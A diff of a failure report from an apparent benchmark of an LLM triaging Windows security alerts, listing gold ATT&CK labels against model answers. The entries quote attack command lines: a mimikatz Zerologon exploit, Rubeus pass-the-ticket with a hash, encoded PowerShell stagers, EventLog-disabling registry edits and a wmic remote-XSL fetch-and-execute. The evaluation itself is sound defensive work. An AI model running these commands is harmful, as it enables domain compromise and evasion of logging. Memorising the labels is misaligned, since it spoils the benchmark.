@@ -1,8 +1,8 @@
 # Failures: single-prompt
 
-14 failures out of 30 rows (dev; 0 transport errors skipped). Model openrouter:nvidia/nemotron-3-super-120b-a12b:free, prompt ee4e8b177422, labels b9ec2d319642.
+15 failures out of 30 rows (dev; 0 transport errors skipped). Model openrouter:nvidia/nemotron-3-super-120b-a12b:free, prompt ee4e8b177422, labels b0695a44d0d4.
 
-Hints (guesses, not buckets): (no retrieval) 14
+Hints (guesses, not buckets): (no retrieval) 15
 
 ---
 ### day2-014  (verdict needs_review != true_positive; technique credit 0.00)
@@ -57,7 +57,7 @@ Event 0:
 
 ### day3-048  (technique credit 0.00)
 
-**hint:** (no retrieval)  [draft label]  
+**hint:** (no retrieval)  
 **bucket:** _retrieval miss | reasoning error | schema error | label error_  
 **note:** 
 
@@ -69,7 +69,7 @@ Event 0:
 - command line `"C:\TMP\CreateNamedPipe.exe"  MSSE-1337-server`
 - parent `C:\Windows\System32\cmd.exe` `"C:\Windows\system32\cmd.exe" `
 
-**Label:** true_positive ['T1134.001'] by `claude-draft`: CreateNamedPipe.exe creating a pipe named MSSE-1337-server matches the Cobalt Strike getsystem named-pipe pattern.
+**Label:** true_positive ['T1134'] by `Mouadh`: CreateNamedPipe.exe creating a pipe named MSSE-1337-server matches the Cobalt Strike getsystem named-pipe pattern; the event shows the pipe, not the impersonation, so the parent technique.
 **Model:** true_positive ['T1021.004'] (confidence 0.85), tier 2, escalated: confidence 0.60 < 0.7
 **Technique credit:** 0.00
 
@@ -83,7 +83,7 @@ Event 0:
 
 ### day3-071  (verdict needs_review != true_positive; technique credit 0.00)
 
-**hint:** (no retrieval)  [draft label]  
+**hint:** (no retrieval)  
 **bucket:** _retrieval miss | reasoning error | schema error | label error_  
 **note:** 
 
@@ -95,7 +95,7 @@ Event 0:
 - command line `C:\Users\pgustavo\Desktop\MoveExcel4.exe  172.18.39.6`
 - parent `C:\Windows\System32\cmd.exe` `"cmd.exe" /c C:\Users\pgustavo\Desktop\MoveExcel4.exe 172.18.39.6`
 
-**Label:** true_positive ['T1021.003'] by `claude-draft`: MoveExcel4.exe <IP> uses DCOM to run an Excel 4.0 macro on a remote host.
+**Label:** true_positive ['T1021.003'] by `Mouadh`: MoveExcel4.exe <IP> uses DCOM to run an Excel 4.0 macro on a remote host.
 **Model:** needs_review [] (confidence 0.65), tier 2, escalated: confidence 0.60 < 0.7
 **Technique credit:** 0.00
 
@@ -109,7 +109,7 @@ Event 0:
 
 ### day3-093  (technique credit 0.50)
 
-**hint:** (no retrieval)  [draft label]  
+**hint:** (no retrieval)  
 **bucket:** _retrieval miss | reasoning error | schema error | label error_  
 **note:** 
 
@@ -121,7 +121,7 @@ Event 0:
 - command line `REG  ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog /t REG_DWORD /v Start /d 4`
 - parent `C:\Windows\System32\cmd.exe` `C:\Windows\system32\cmd.exe`
 
-**Label:** true_positive ['T1685.001'] by `claude-draft`: reg add sets the EventLog service Start value to 4 (disabled), so events stop being recorded after the next boot.
+**Label:** true_positive ['T1685.001'] by `Mouadh`: reg add sets the EventLog service Start value to 4 (disabled), so events stop being recorded after the next boot.
 **Model:** true_positive ['T1562.001'] (confidence 0.95), tier 1
 **Technique credit:** 0.50
 
@@ -135,7 +135,7 @@ Event 0:
 
 ### day3-096  (technique credit 0.50)
 
-**hint:** (no retrieval)  [draft label]  
+**hint:** (no retrieval)  
 **bucket:** _retrieval miss | reasoning error | schema error | label error_  
 **note:** 
 
@@ -147,7 +147,7 @@ Event 0:
 - command line `REG.exe  ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d C:\Users\wardog\AppData\Local\Temp\art.bat /f`
 - parent `C:\Windows\System32\cmd.exe` `"C:\windows\system32\cmd.exe" `
 
-**Label:** true_positive ['T1037.001'] by `claude-draft`: reg add HKCU/Environment UserInitMprLogonScript pointing at a .bat in Temp registers a logon script for persistence.
+**Label:** true_positive ['T1037.001'] by `Mouadh`: reg add HKCU/Environment UserInitMprLogonScript pointing at a .bat in Temp registers a logon script for persistence.
 **Model:** true_positive ['T1037.004'] (confidence 0.95), tier 1
 **Technique credit:** 0.50
 
@@ -161,7 +161,7 @@ Event 0:
 
 ### day3-112  (technique credit 0.00)
 
-**hint:** (no retrieval)  [draft label]  
+**hint:** (no retrieval)  
 **bucket:** _retrieval miss | reasoning error | schema error | label error_  
 **note:** 
 
@@ -173,7 +173,7 @@ Event 0:
 - command line `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJAA2ADgANgA2AD0AWwByAEUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAHQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBlAGAATABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAGUANwA9ACQANgA4ADYANgAuAEc... (+4537)`
 - parent `C:\Windows\System32\wscript.exe` `"C:\windows\System32\WScript.exe" "C:\Users\pgustavo\Desktop\launcher.vbs" `
 
-**Label:** true_positive ['T1059.001'] by `claude-draft`: PowerShell -noP -sta -w 1 -enc (encoded stager) spawned by wscript.exe running launcher.vbs.
+**Label:** true_positive ['T1059.001'] by `Mouadh`: PowerShell -noP -sta -w 1 -enc (encoded stager) spawned by wscript.exe running launcher.vbs.
 **Model:** true_positive ['T1027', 'T1562.001'] (confidence 0.95), tier 1
 **Technique credit:** 0.00
 
@@ -185,9 +185,35 @@ Event 0:
 
 ---
 
+### day3-113  (technique credit 0.00)
+
+**hint:** (no retrieval)  
+**bucket:** _retrieval miss | reasoning error | schema error | label error_  
+**note:** 
+
+**Alert:** Atomic capture — manual review (medium), source dataset `mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip`
+
+Event 0:
+- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
+- process `C:\Windows\System32\cmd.exe`
+- command line `"cmd.exe" /c C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`
+- parent `C:\Users\pgustavo\Desktop\GruntHTTP.exe` `"C:\Users\pgustavo\Desktop\GruntHTTP.exe" `
+
+**Label:** true_positive ['T1210'] by `Mouadh`: cmd.exe /c mimikatz.exe "lsadump::zerologon ... /exploit" spawned by GruntHTTP.exe, a Covenant C2 implant: the command line shows the Zerologon (CVE-2020-1472) exploit against a domain controller.
+**Model:** true_positive ['T1003'] (confidence 0.95), tier 1
+**Technique credit:** 0.00
+
+> The event shows cmd.exe executing mimikatz with the Zerologon exploit (lsadump::zerologon) targeting a domain controller, which is a clear credential‑access attempt using a known attack tool. The parent process is GruntHTTP.exe, indicating a likely malicious launcher.
+
+**Retrieved techniques (top 5):** []  
+**Retrieved Sigma rules:** []
+**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/bd988d57eb24e469955f173e350d38fe
+
+---
+
 ### day3-123  (technique credit 0.00)
 
-**hint:** (no retrieval)  [draft label]  
+**hint:** (no retrieval)  
 **bucket:** _retrieval miss | reasoning error | schema error | label error_  
 **note:** 
 
@@ -199,7 +225,7 @@ Event 0:
 - command line `wmic  process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"`
 - parent `C:\Windows\System32\cmd.exe` `"C:\windows\system32\cmd.exe" `
 
-**Label:** true_positive ['T1220'] by `claude-draft`: wmic process list /FORMAT:<remote .xsl URL> downloads and executes JScript from a remote stylesheet.
+**Label:** true_positive ['T1220'] by `Mouadh`: wmic process list /FORMAT:<remote .xsl URL> downloads and executes JScript from a remote stylesheet.
 **Model:** true_positive ['T1047.001'] (confidence 0.95), tier 1
 **Technique credit:** 0.00
 
@@ -213,7 +239,7 @@ Event 0:
 
 ### day3-128  (technique credit 0.50)
 
-**hint:** (no retrieval)  [draft label]  
+**hint:** (no retrieval)  
 **bucket:** _retrieval miss | reasoning error | schema error | label error_  
 **note:** 
 
@@ -225,7 +251,7 @@ Event 0:
 - command line `wevtutil  set-log Security /logfilename:"C:\Windows\System32\winevt\Not-Important-Log.evtx"`
 - parent `-` `-`
 
-**Label:** true_positive ['T1685.001'] by `claude-draft`: wevtutil set-log Security /logfilename points the Security log at a decoy file name, tampering with event logging.
+**Label:** true_positive ['T1685.001'] by `Mouadh`: wevtutil set-log Security /logfilename points the Security log at a decoy file name, tampering with event logging.
 **Model:** true_positive ['T1562.001'] (confidence 0.9), tier 1
 **Technique credit:** 0.50
 
@@ -239,7 +265,7 @@ Event 0:
 
 ### day3-136  (technique credit 0.25)
 
-**hint:** (no retrieval)  [draft label]  
+**hint:** (no retrieval)  
 **bucket:** _retrieval miss | reasoning error | schema error | label error_  
 **note:** 
 
@@ -251,7 +277,7 @@ Event 0:
 - command line `REG  ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MiniNt`
 - parent `C:\Windows\System32\cmd.exe` `C:\Windows\system32\cmd.exe`
 
-**Label:** true_positive ['T1685.001'] by `claude-draft`: reg add of a MiniNt key under CurrentControlSet is the same trick to keep the event log service from starting.
+**Label:** true_positive ['T1685.001'] by `Mouadh`: reg add of a MiniNt key under CurrentControlSet is the same trick to keep the event log service from starting.
 **Model:** true_positive ['T1112'] (confidence 0.8), tier 1
 **Technique credit:** 0.25
 
@@ -265,7 +291,7 @@ Event 0:
 
 ### day3-145  (technique credit 0.50)
 
-**hint:** (no retrieval)  [draft label]  
+**hint:** (no retrieval)  
 **bucket:** _retrieval miss | reasoning error | schema error | label error_  
 **note:** 
 
@@ -277,7 +303,7 @@ Event 0:
 - command line `"C:\users\sbeavers\Desktop\Rubeus.exe" asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt`
 - parent `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` `"C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAUwBpAG8ATgBUAGEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAE8ATgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABDADYANwA9AFsAUgBlAEYAXQAuAEEAcwBTAEUAbQBiAGwAeQAuAEcARQB0AFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABDADYANwApAHsAJAA2AEMANAA9ACQAQwA2ADcALgBHAGUAdABWAGEA... (+4512)`
 
-**Label:** true_positive ['T1550.003'] by `claude-draft`: Rubeus asktgt with an RC4 hash and /ptt requests a Kerberos ticket and injects it into the session (pass-the-ticket).
+**Label:** true_positive ['T1550.003'] by `Mouadh`: Rubeus asktgt with an RC4 hash and /ptt requests a Kerberos ticket and injects it into the session (pass-the-ticket).
 **Model:** true_positive ['T1550.004'] (confidence 0.95), tier 1
 **Technique credit:** 0.50
 
@@ -291,7 +317,7 @@ Event 0:
 
 ### day3-151  (technique credit 0.00)
 
-**hint:** (no retrieval)  [draft label]  
+**hint:** (no retrieval)  
 **bucket:** _retrieval miss | reasoning error | schema error | label error_  
 **note:** 
 
@@ -303,7 +329,7 @@ Event 0:
 - command line `C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe  "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`
 - parent `C:\Windows\System32\cmd.exe` `"cmd.exe" /c C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`
 
-**Label:** true_positive ['T1210'] by `claude-draft`: mimikatz lsadump::zerologon /target exploits CVE-2020-1472 (Zerologon) against a domain controller.
+**Label:** true_positive ['T1210'] by `Mouadh`: mimikatz lsadump::zerologon /target exploits CVE-2020-1472 (Zerologon) against a domain controller.
 **Model:** true_positive ['T1068'] (confidence 0.95), tier 1
 **Technique credit:** 0.00
 
@@ -317,7 +343,7 @@ Event 0:
 
 ### day3-166  (verdict needs_review != true_positive; technique credit 0.00)
 
-**hint:** (no retrieval)  [draft label]  
+**hint:** (no retrieval)  
 **bucket:** _retrieval miss | reasoning error | schema error | label error_  
 **note:** 
 
@@ -329,7 +355,7 @@ Event 0:
 - command line `C:\Users\pgustavo\Desktop\MoveExcel4.exe  172.18.39.6`
 - parent `C:\Windows\System32\cmd.exe` `"cmd.exe" /c C:\Users\pgustavo\Desktop\MoveExcel4.exe 172.18.39.6`
 
-**Label:** true_positive ['T1021.003'] by `claude-draft`: MoveExcel4.exe <IP> attempts DCOM lateral movement by remote Excel 4.0 macro execution.
+**Label:** true_positive ['T1021.003'] by `Mouadh`: MoveExcel4.exe <IP> attempts DCOM lateral movement by remote Excel 4.0 macro execution.
 **Model:** needs_review [] (confidence 0.6), tier 2, escalated: confidence 0.60 < 0.7
 **Technique credit:** 0.00
 
@@ -343,7 +369,7 @@ Event 0:
 
 ### day3-176  (technique credit 0.25)
 
-**hint:** (no retrieval)  [draft label]  
+**hint:** (no retrieval)  
 **bucket:** _retrieval miss | reasoning error | schema error | label error_  
 **note:** 
 
@@ -355,7 +381,7 @@ Event 0:
 - command line `C:\windows\system32\cmd.exe /C start /b C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABlADIAPQBbAHIARQBGAF0ALgBBAFMAcwBlAE0AQgBsAHkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAEUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANAAzAEQARQAyA... (+4599)`
 - parent `C:\Windows\System32\services.exe` `C:\windows\system32\services.exe`
 
-**Label:** true_positive ['T1569.002'] by `claude-draft`: cmd.exe started by services.exe running 'start /b powershell -enc' is a remote service executing an encoded stager (PsExec-style).
+**Label:** true_positive ['T1569.002'] by `Mouadh`: cmd.exe started by services.exe running 'start /b powershell -enc' is a remote service executing an encoded stager (PsExec-style).
 **Model:** true_positive ['T1059.001', 'T1027'] (confidence 0.95), tier 1
 **Technique credit:** 0.25
 
